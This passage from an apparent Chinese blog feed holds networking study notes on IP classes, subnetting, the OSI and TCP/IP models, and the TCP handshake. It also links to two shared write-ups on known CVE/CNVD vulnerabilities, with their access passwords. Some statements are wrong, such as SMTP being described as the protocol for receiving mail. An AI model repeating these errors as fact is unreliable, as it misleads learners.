class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxRectRight1&quot;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxRectRight2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxCircRight&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="comment">&lt;!-- 足球 --&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;football&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxColLine&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这次主要的改动如下：</p><ul><li><p>提取公共 css 代码</p></li><li><p>使用 <code>float</code>  属性进行布局</p></li><li><p>删除重叠部分边框样式（叠加之后颜色会变粗，这里去掉同一侧的边框样式）</p></li></ul><p>不过需要注意的是由于 <code>boxColLine</code>  不是 <code>float</code>  元素，应该放置最下方</p><p>这样可以利用浮动的特点，防止对布局产生影响</p><p><strong>最终效果</strong></p><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210525004853.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;盒模型补充&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#盒模型补充&quot;&gt;#&lt;/a&gt; 盒模型补充&lt;/h1&gt;
&lt;p&gt;笔记来源：&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cuYmlsaWJpbG</summary>
      
    
    
    
    <category term="web前端" scheme="https://sun-spots.github.io/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>计算机网络</title>
    <link href="https://sun-spots.github.io/2022/01/11/%E4%BF%AE%E6%94%B9/2022-01-11-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <id>https://sun-spots.github.io/2022/01/11/%E4%BF%AE%E6%94%B9/2022-01-11-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</id>
    <published>2022-01-11T15:05:00.000Z</published>
    <updated>2022-01-17T01:31:14.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计算机网络"><a class="markdownIt-Anchor" href="#计算机网络">#</a> 计算机网络</h1><p>两个基本的漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.yuque.com/docs/share/8e0c043d-12bc-4ed9-b6e3-869597527c9f?<span class="comment">#（密码：tc8g） 《CNVD-2021-17369：锐捷Smartweb管理系统 密码信息泄露漏洞》</span></span><br><span class="line">https://www.yuque.com/docs/share/e860a614-90b9-40ca-<span class="number">8132</span>-dda9464ba5e6?<span class="comment">#（密码：oxxh） 《CVE-2021-37580：Apache ShenYu JWT认证缺陷漏洞》</span></span><br></pre></td></tr></table></figure><h1 id="一osi七层参考模型"><a class="markdownIt-Anchor" href="#一osi七层参考模型">#</a> 一：OSI 七层参考模型</h1><p>计算机网络是指将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路连接起来，在网络操作系统，网络管理软件及网络通信协议的管理和协调下，实现资源共享和信息传递的计算机系统。</p><p><strong>计算机网络的分类</strong></p><table><thead><tr><th>依照</th><th>分类类型</th></tr></thead><tbody><tr><td>地理范围</td><td>局域网 (LAN)/ 城域网 (MAN)/ 广域网 (WAN)</td></tr><tr><td>交换方式</td><td>线路交换网络 / 报文交换网络 / 分组交换网络</td></tr><tr><td>拓扑结构</td><td>树形网络 / 总线型网络 / 环形网络 / 网状网络</td></tr></tbody></table><ul><li><p><strong>局域网</strong>：是指范围在几百米到十几公里内办公楼群或校园内的计算机相互连接所构成的计算机网络。计算机局域网被广泛应用于连接校园、工厂以及机关的个人计算机或工作站，以利于个人计算机或工作站之间共享资源（如打印机）和数据通信。</p></li><li><p><strong>城域网</strong>：所采用的技术基本上与局域网相类似，只是规模上要大一些。城域网既可以覆盖相距不远的几栋办公楼，也可以覆盖一个城市；既可以是私人网，也可以是公用网。</p></li><li><p><strong>广域网</strong>：通常跨接很大的物理范围，如一个国家。</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641813403231-9375dea7-5391-444b-a7c8-5e584ec4f9e4.png" alt="img"></p><p><strong>》〉》通信要素《〈《</strong></p><p>在网络上只要利用 IP 地址就可以找到目标主机，因此要攻击某个网络主机就要应该先确定该目标主机的域名或 IP 地址。</p><p>阐述：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">所谓的ip地址就是一种主机编址方式，给每个连接在Intelnet上的主机分配一个32bit的地址，也称为网际协议地址。</span><br><span class="line">按照TCP/IP（Transport Control Protocol/Intelnet Protocol，传输控制协议）协议簇的规定，IP地址用二进制来表示，每个IP地址长32bit，换算成字节就是<span class="number">4</span>字节（Byte）。例如，一个采用二进制形式的ip地址是“000010100000000000000000001”，这么长的地址处理起来很费劲，为了方便使用，IP地址经常被写成十进制的形式，中间使用<span class="string">&quot;.&quot;</span>分割不同的字节，即用XXX.XXX.XXX.XXX的形式来表现，每组XXX代表小于等于<span class="number">255</span>的十进制数，例如<span class="number">192.168</span><span class="number">.38</span><span class="number">.6</span>。IP地址的这种表示方法称为“点分十进制表示法”，这显然比二进制的<span class="number">1</span>和<span class="number">0</span>容易记忆多了。</span><br></pre></td></tr></table></figure><p>一个完整的 IP 地址信息应该包括：IP 地址 / 子网掩码 / 默认网关 / 和 DNS… 只有四个协同工作时，用户才可以访问 Internet 并被 Internet 的计算机所访问…</p><p>（采用静态 IP 地址接入 Internet 时候，ISP（网络提供商）应当为用户提供全部 IP 地址信息）</p><ul><li>IP 地址：企业网络使用的合法 IP 地址，由提供 Internet 接入的服务商（ISP）分配公网地址，公网地址可以由网络管理员自由分配。但网络内部的私有 IP 地址不能相同，否则会发生 IP 地址冲突，导致网络连接失败。一般情况，IP 地址可以分为 5 大类别：A 类 / B 类 / C 类 / D 类及 E 类。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">A类地址以<span class="number">0</span>开头，第一个字节作为网络号，地址范围为：<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">127.255</span><span class="number">.255</span><span class="number">.255</span>；   A类IP地址前<span class="number">8</span>位表示网络号，后<span class="number">24</span>位表示主机号</span><br><span class="line">B类地址以<span class="number">10</span>开头，前两个字节作为网络号，地址范围是：<span class="number">128.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">191.255</span><span class="number">.255</span><span class="number">.255</span>;  B类IP地址前<span class="number">16</span>位表示网络号，后<span class="number">16</span>位表示主机号</span><br><span class="line">C类地址以<span class="number">110</span>开头，前三个字节作为网络号，地址范围是：<span class="number">192.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">223.255</span><span class="number">.255</span><span class="number">.255</span>；C类IP地址前<span class="number">24</span>位表示网络号，后<span class="number">8</span>位表示主机号</span><br><span class="line">D类地址以<span class="number">1110</span>开头，地址范围是<span class="number">224.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">239.255</span><span class="number">.255</span><span class="number">.255</span>，D类地址作为组播地址（一对多的通信）；</span><br><span class="line">E类地址以<span class="number">1111</span>开头，地址范围是<span class="number">240.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span>，E类地址为保留地址，供以后使用。</span><br><span class="line">注：只有A,B,C有网络号和主机号之分，D类地址和E类地址没有划分网络号和主机号。</span><br><span class="line"><span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">该IP地址指的是受限的广播地址。受限广播地址与一般广播地址（直接广播地址）的区别在于，受限广播地址只能用于本地网络，路由器不会转发以受限广播地址为目的地址的分组；一般广播地址既可在本地广播，也可跨网段广播。</span><br><span class="line">例如：主机<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>/<span class="number">30</span>上的直接广播数据包后，另外一个网段<span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>/<span class="number">30</span>也能收到该数据报；若发送受限广播数据报，则不能收到。</span><br><span class="line">注：一般的广播地址（直接广播地址）能够通过某些路由器（当然不是所有的路由器），而受限的广播地址不能通过路由器。</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span>   </span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>~<span class="number">127.255</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">被用作回环地址，回环地址表示本机的地址，常用于对本机的测试，用的最多的是<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>。</span><br><span class="line">A、B、C类私有地址</span><br><span class="line">私有地址(private address)也叫专用地址，它们不会在全球使用，只具有本地意义。</span><br><span class="line">A类私有地址：<span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span>，范围是：<span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">10.255</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">B类私有地址：<span class="number">172.16</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>，范围是：<span class="number">172.16</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">172.31</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">C类私有地址：<span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span>，范围是：<span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">192.168</span><span class="number">.255</span><span class="number">.255</span></span><br></pre></td></tr></table></figure><ul><li>子网掩码：子网掩码是于 IP 地址结合使用的一种技术，其主要作用有两个：</li></ul><ol><li><p>用于确定地址中的网络号和主机号</p><p>2. 用于将一个大的 IP 网络划分为若干个小自网络（划分子网）</p></li></ol><p>什么是子网掩码？</p><p>子网掩码是标志两个 IP 地址是否同属于一个子网的，也是 32 位二进制地址，其每一个为 1 代表该位是网络位，为 0 代表主机位。它和 IP 地址一样也是使用点式十进制来表示的。如果两个 IP 地址在子网掩码的按位与的计算下所得结果相同，即表明它们共属于同一子网中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A类地址来说，默认的子网掩码是<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span>；</span><br><span class="line">对于B类地址来说默认的子网掩码是<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span>；</span><br><span class="line">对于C类地址来说默认的子网掩码是<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><ul><li>默认网关：当一台主机找不到可用的网关时，就把数据包发送给指定的默认网关，由这个网管来处理数据包。</li></ul><p>（从一个网络向另一个网络发送消息，也必须经过一道 “关口” 这道关口就是网关）</p><ul><li>DNS 地址：DNS 服务用于将用户的域名请求转换为 IP 地址。如果企业网络没有提供 DNS 服务，则 DNS 服务器的 IP 地址应当是 ISP 的 DNS 服务器。</li></ul><p>【附件】全国各省市的 DNS 服务器 IP 地址。见附录</p><p><strong>》》》OSI 七层参考模型《《《</strong></p><p>有了计算机等设备，也就得考虑如何连接起来他们，这就是他们之间该如何通信的问题。对计算机来说，就是一个硬件设备，如何让计算机与计算机连接起来，必需需要软件的支撑。那么支持计算机通讯的软件是什么呢？就是计算机网络参考模型。这个计算机网络参考模型就是计算机网络软件。最经典的当然是国际化标准的 OSI（Open System InterConnect  开放式系统互联）参考模型。它是通过一个机器上的一个应用进程与另一个机器上的进程进行信息交互。</p><p>OSI 七层模型概念：</p><p>1：OSI (open system Interconnect), 即开放式系统互联。一般叫 OSI 参考模型，是 ISO (国际标准化组织) 组织在 1985 年研究的网络互联模型。</p><p>2：ISO 为了更好的使网络应用更为普及，推出了 OSI 参考模型。其含义就是推荐所有公司使用这个规范来控制网络。这样所有公司都有相同的规范，就能产生互联。</p><p>3：OSI 定义了网络互联的七层框架（物理层、数据链层、网络层、传输层、会话层、表示层、应用层），即 ISO 开放互连系统参考模型。</p><p>4：每一层实现各自的功能和协议，并完成与相邻层的接口通信。OSI 的服务定义详细说明了各层所提供的服务。某一层的服务就是该层及其下各层的一种功能，它同通过接口提供更高一层。各层所提供的服务与这些服务是怎末实现无关。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623377768783-e019cdb1-bd06-4830-b55b-29feed6e84f7.png" alt="img"></p><p><strong>》》》OSI 七层作用介绍《《《</strong></p><p>1：应用层</p><p>应用层是 OSI 参考模型的最高层，是用户与网络的接口。该层通过应用程序来完成网络用户的应用需求，如文件传输、收发电子邮件等。</p><p>【提供与用户的接口，最终呈现给用户】</p><p>2：表示层</p><p>表示层处理流经结点的数据编码的表示方式问题，以保证一个系统应用层发出的信息可被另一系统的应用层读出。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据表示格式转换成网络通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p><p>【数据的表示 / 安全 / 压缩】</p><p>3：会话层</p><p>会话层主要功能是管理和协调不同主机上各种进程之间的通信（会话），即负责建立、管理和终止应用程序之间的会话。会话层得名的原因是它很类似于两个实体间的会话概念。例如，一个交互的用户会话以登录到计算机开始，以注销结束。</p><p>【建立用户之间的会话关系】</p><p>4：传输层</p><p>传输层的作用是为上层协议提供端到端的可靠的、透明的数据传输服务，包括处理差错控制和流量控制等问题。该层向高层屏蔽了下层数据通信的细节，使高层用户看到的只是在两个传输实体间的一条主机到主机的、可由用户控制和设定的、可靠的数据通路。</p><p>传输层传送的协议数据单元称为段（data segment）或报文（Message）。</p><p>【定义传输数据的协议端口号以及流控和差错校验】</p><p>5：网络层：</p><p>网络层是为其上层传输层提供服务，传送的协议数据单元称为数据包 (Packet) 或分组。该层的主要作用是解决如何使数据包通过各结点传送的问题，即通过路径选择算法（路由）将数据包送到目的地。另外，为避免通信子网中出现过多的数据包而造成的网络阻塞，需要对流入的数据包数量进行控制（拥塞控制）。当数据包要跨越多个通信子网才能到达目的地时，还要解决网际互连的问题。</p><p>类比：网络层相当于邮局中的信件分拣人员。</p><p>网络层的作用：</p><ul><li><p>路由选路</p></li><li><p>拥塞控制、差错检测与恢复</p></li><li><p>网络互联</p></li></ul><p>【进行逻辑地址寻址，实现不同网络之间的路径选择】</p><p>6：数据链层</p><p>数据链路层是为其上层网络层提供服务，解决两个相邻结点之间的通信问题，传送的协议数据单元称为数据帧 (Data frame)。</p><p>数据帧中包含物理地址（又称 MAC 地址）、控制码、数据及校验码等信息。该层的主要作用是通过校验、确认和反馈重发等手段，将不可靠的物理链路转换成对网络层来说无差错的数据链路。</p><p>此外，数据链路层还要协调收发双方的数据传输速率，即进行流量控制，以防止接收方因来不及处理发送方来的高速数据而导致缓冲器溢出及线路阻塞。</p><p>类比：数据链路层相当于邮局中的装拆箱人员。</p><p>数据链层的作用：</p><ul><li><p>物理地址定义 网络拓扑机构</p></li><li><p>链路参数差错验证</p></li><li><p>物理介质访问流控制</p></li></ul><p>【进行逻辑链接 / 进行硬件地址寻址 / 差错校验等功能】</p><p>7：物理层</p><p>物理层是 OSI 参考模型的最底层，它利用传输介质为其上层数据链路层提供物理连接。它主要关心的是通过物理链路从一个节点向另一个节点传送比特流（bit），物理链路可能是铜缆、光纤、无线或其他的通讯媒介。它关心的问题有：多少伏电压代表 1？多少伏电压代表 0？时钟速率是多少？采用全双工、半双工还是单工通信？</p><p>总的来说物理层关心的是链路的机械、电气、功能和规程特性。</p><p>类比：物理层相当于邮局中的搬运工人。Physical Layer</p><p>物理层的作用：</p><ul><li>提供传输数据的物理通路，传输数据</li></ul><p>​    【建立 / 维护 / 断开物理层链接】</p><p>记忆口诀：应表会传网数物</p><h1 id="二tcpip五层模型"><a class="markdownIt-Anchor" href="#二tcpip五层模型">#</a> 二：TCP/IP 五层模型</h1><p>由于 ISO 指定的 OSI 参考模型过于庞大、复杂、在实现制作过程造成了很多困难，从而招致了很多批评。在现实中，TCP/IP 协议获得了广泛的应用。目前主流的操作系统网络协议基本上都采用了 TCP/IP 协议。而 TCP/IP 与 OSI 在分层模型上稍有区别：OSI 参考模型注重 &quot;通信协议必要的功能是什么&quot;，而 TCP/IP 则更强调 &quot;在计算机上实现协议应该开发那种程序&quot;。</p><ul><li><p>另外一个著名的模型是 TCP/IP 模型，TCP/IP 是传输控制协议 / 网络互联协议的简称；</p></li><li><p>早期的 TCP/IP 协议是一个四层结构，在后来的使用过程中借鉴 OSI 的七层参考模型，形成了一个新的五层结构；</p></li><li><p>TCP/IP 是一系列协议的集合，所以严格的称呼应该是 TCP/IP 协议簇；</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641816411268-9a24cead-13c8-460b-944a-6a38660bc7c3.png" alt="img"></p><p><strong>》》》TCP/IP 五层与 OSI 七层的区别《《《</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2336202/1641210571031-56562245-f047-4fcb-a39e-ad0d6c01d825.png" alt="img"></p><p>1：开放式系统互联模型是一个参考标准，解释协议相互之间应该如何相互作用。TCP/IP 协议是美国国防部发明的，是让互联网成为了目前这个样子的标准之一。</p><p>2：开放式系统互联模型中没有清楚地描绘 TCP/IP 协议，但是在解释 TCP/IP 协议很容易想到开放式系统互联模型。两者的主要区别如下：TCP/IP 协议中的应用层处理开放式系统互联模型中的第五层、第六层和第七层的功能。TCP/IP 协议中的传输层并不能总是保证在传输层可靠地传输数据包，而开放式系统互联模型可以做到。TCP/IP 协议还提供一项名为 UDP（用户数据报协议）的选择。UDP 不能保证可靠的数据包传输。</p><p><strong>》》》模型对应的协议《《《</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641816722890-fe61567a-f1fb-4fb9-b4df-d4753fab38fd.png" alt="img"></p><table><thead><tr><th>应用层</th></tr></thead><tbody><tr><td>HTTP（超文本传输协议 80）：用于浏览器和 Web 服务器之间的请求和响应的交互</td></tr><tr><td>DNS（域名系统 53）：用于连接 DNS 服务器</td></tr><tr><td>SMTP（简单邮件传输协议 25）：用于接收邮件</td></tr><tr><td>FTP（文件传输协议 21）：用于控制连接 FTP 服务器</td></tr><tr><td>传输层</td></tr><tr><td>TCP（传输控制协议）和 UDP（用户数据报协议）</td></tr><tr><td>网络层 (本层 TCP/IP 定义了 IP 协议，而 IP 协议又由四个支撑协议组成)</td></tr><tr><td>ARP（地址解析协议）：用于在局域网中根据 IP 地址获取物理地址</td></tr><tr><td>RARP（逆地址解析协议）：用于在局域网中通过 ARP 表根据物理地址请求 IP 地址</td></tr><tr><td>ICMP（网际控制报文协议）：用于验证网络是否畅通</td></tr><tr><td>IGMP（网际组管理协议）：用于主机与组播路由器之间组播通信</td></tr><tr><td>物理层和数据链路层</td></tr><tr><td>IEEE802.3 有线局域网（以太网）标准</td></tr><tr><td>IEEE802.11 无线局域网标准</td></tr></tbody></table><p><strong>》》》TCP 协议《《《</strong></p><p>在 TCP/IP 协议中，TCP 协议提供可靠的连接服务，采用三次握手建立一个连接.</p><p>TCP 是面向连接的通信协议，通过三次握手建立连接，通讯完成时要拆除连接，由于 TCP 是面向连接的所以只能用于端到端的通讯。TCP 提供的是一种可靠的数据流服务，采用 &quot;带重传的肯定确认&quot; 技术来实现传输的可靠性。TCP 还采用一种称为 &quot;滑动窗口&quot; 的方式进行流量控制，所谓窗口实际表示接收能力，用以限制发送方的发送速度。</p><p>建立 TCP 连接，就是指建立一个 TCP 连接时，需要客户端和服务端总共发送 3 个包以确认连接的建立。在 socket 编程中，这一过程由客户端执行 connect 来触发。</p><p><strong>注：seq</strong>:&quot;sequance&quot; 序列号；<strong>ack</strong>:&quot;acknowledge&quot; 确认号；<strong>SYN</strong>:&quot;synchronize&quot; 请求同步标志；<strong>；ACK</strong>:“acknowledge&quot; 确认标志”<strong>；FIN</strong>：&quot;Finally&quot; 结束标志。</p><p>使用 TCP 的协议：</p><ul><li><p>FTP（文件传输协议）21 号端口 20 号端口</p></li><li><p>Telnet（远程登录协议）</p></li><li><p>SMTP（简单邮件传输协议）</p></li><li><p>POP3（和 SMTP 相对，用于接收邮件）</p></li><li><p>HTTP 协议等。</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641818342862-a9572f54-aef6-41d3-ae56-30495c09107e.png" alt="img"></p><p><strong>第一次握手</strong>：Client 将标志位 SYN 置为 1，随机产生一个值 seq=J，并将该数据包发送给 Server，Client 进入 SYN_SENT 状态，等待 Server 确认。</p><p>SYN：同步序列编号 (Synchronize Sequence Numbers)</p><p><strong>第二次握手</strong>：Server 收到数据包后由标志位 SYN=1 知道 Client 请求建立连接，Server 将标志位 SYN 和 ACK 都置为 1，ack=J+1，随机产生一个值 seq=K，并将该数据包发送给 Client 以确认连接请求，Server 进入 SYN_RCVD 状态。</p><p><strong>第三次握手</strong>：Client 收到确认后，检查 ack 是否为 J+1，ACK 是否为 1，如果正确则将标志位 ACK 置为 1，ack=K+1，并将该数据包发送给 Server，Server 检查 ack 是否为 K+1，ACK 是否为 1，如果正确则连接建立成功，Client 和 Server 进入 ESTABLISHED 状态，完成三次握手，随后 Client 与 Server 之间可以开始传输数据了。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2336202/1641217203992-87ac02b3-a6fe-4389-917a-887fd4de1e4b.png" alt="img"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">为什么需要三次握手？</span><br><span class="line">client发出的第一个连接请求报文段并没有丢失，而是在某个网络结点长时间的滞留了，以致延误到连接释放以后的某个时间才到达server。本来这是一个早已失效的报文段。但server收到此失效的连接请求报文段后，就误认为是client再次发出的一个新的连接请求。于是就向client发出确认报文段，同意建立连接。假设不采用三次握手，那么只要server发出确认，新的连接就建立了。由于现在client并没有发出建立连接的请求，因此不会理睬server的确认，也不会向server发送数据。但server却以为新的运输连接已经建立，并一直等待client发来数据。这样，server的很多资源就白白浪费掉了。采用三次握手的办法可以防止上述现象发生。</span><br></pre></td></tr></table></figure><p>四次挥手（Four-Way Wavehand）即终止 TCP 连接，就是指断开一个 TCP 连接时，需要客户端和服务端总共发送 4 个包以确认连接的断开。在 socket 编程中，这一过程由客户端或服务端任一方执行 close 来触发…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641819982983-b25a8e05-291a-4bdc-83dd-5f9a97964972.png" alt="img"></p><p><strong>第一次挥手</strong>：Client 发送一个 FIN，用来关闭 Client 到 Server 的数据传送，Client 进入 FIN_WAIT_1 状态。</p><p><strong>第二次挥手</strong>：Server 收到 FIN 后，发送一个 ACK 给 Client，确认序号为收到序号 + 1（与 SYN 相同，一个 FIN 占用一个序号），Server 进入 CLOSE_WAIT 状态。</p><p><strong>第三次挥手</strong>：Server 发送一个 FIN，用来关闭 Server 到 Client 的数据传送，Server 进入 LAST_ACK 状态。</p><p><strong>第四次挥手</strong>：Client 收到 FIN 后，Client 进入 TIME_WAIT 状态，接着发送一个 ACK 给 Server，确认序号为收到序号 + 1， Server 进入 CLOSED 状态，完成四次挥手。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【问题<span class="number">1</span>】为什么连接的时候是三次握手，关闭的时候却是四次握手？</span><br><span class="line">答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，<span class="string">&quot;你发的FIN报文我收到了&quot;</span>。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。</span><br></pre></td></tr></table></figure><p>如果有大量的连接，每次在连接、关闭时都要三次握手，四次挥手，会很明显会造成性能低下，因此，HTTP 有一种叫做 keep connection 的机制，它可以在传输数据后仍然保持连接，当客户端再次获取数据时，直接使用刚刚空闲下的连接而无需再次握手…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641820064122-1df469e4-3437-4dbb-ab08-a45a7438b2fb.png" alt="img"></p><p><strong>》》》UDP 协议《《《</strong></p><p>UDP 用户数据报协议，是面向无连接的通讯协议，UDP 数据包括目的端口号和源端口号信息，由于通讯不需要连接，所以可以实现广播发送。</p><p>UDP 通讯时不需要接收方确认，属于不可靠的传输，可能会出现丢包现象，实际应用中要求程序员编程验证。</p><p>UDP 与 TCP 位于同一层，但它不管数据包的顺序、错误或重发。因此，UDP 不被应用于那些使用虚电路的面向连接的服务，UDP 主要用于那些面向查询 — 应答的服务，例如 NFS。相对于 FTP 或 Telnet，这些服务需要交换的信息量较小。</p><p>每个 UDP 报文分 UDP 报头和 UDP 数据区两部分。报头由四个 16 位长（2 字节）字段组成，分别说明该报文的源端口、目的端口、报文长度以及校验值。UDP 报头由 4 个域组成，其中每个域各占用 2 个字节，具体如下：</p><ul><li><p>（1）源端口号；</p></li><li><p>（2）目标端口号；</p></li><li><p>（3）数据报长度；</p></li><li><p>（4）校验值。</p></li></ul><p>使用 UDP 协议包括：TFTP（简单文件传输协议）、SNMP（简单网络管理协议）、DNS（域名解析协议）、NFS、BOOTP。</p><p><strong>》》》TCP 和 UDP 的区别《《《</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>：连接方面区别：</span><br><span class="line">i：TCP面向连接（如打电话要先拨号建立连接）。</span><br><span class="line">ii：UDP是无连接的，即发送数据之前不需要建立连接。</span><br><span class="line"><span class="number">2</span>：安全方面的区别：</span><br><span class="line">i：TCP提供可靠的服务，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达。</span><br><span class="line">ii：UDP尽最大努力交付，即不保证可靠交付。</span><br><span class="line"><span class="number">3</span>：传输效率的区别：</span><br><span class="line">i：TCP传输效率相对较低。</span><br><span class="line">ii：UDP传输效率高，适用于对高速传输和实时性有较高的通信或广播通信。</span><br><span class="line"><span class="number">4</span>：连接对象数量的区别：</span><br><span class="line">i：TCP连接只能是点到点、一对一的。</span><br><span class="line">ii：UDP支持一对一，一对多，多对一和多对多的交互通信。</span><br></pre></td></tr></table></figure><p><strong>》》》数据封装与解封装过程《《《</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641820630031-3de6d764-4c7f-4949-90bf-9a79145d217e.png" alt="img"></p><p>1. 数据封装过程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>在应用层，用户的数据被转换成二进制数据</span><br><span class="line"><span class="number">2.</span>在传输层，上层数据被分割成很小的数据段，并为每个分段后的数据封装TCP报文头部</span><br><span class="line"><span class="number">3.</span>在网络层，上层数据被封装上新的报文头部——IP头部</span><br><span class="line"><span class="number">4.</span>在数据链路层，上层数据被封装一个MAC头部，其内部有一个关键的字段信息——MAC地址</span><br><span class="line"><span class="number">5.</span>在物理层，无论在之前封装的报文头部还是上层的数据信息都是由二进制数组成的，在物理层，将这些二进制数字组成的比特流转换成电信号在网络中传输</span><br></pre></td></tr></table></figure><p>2. 数据解封装过程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 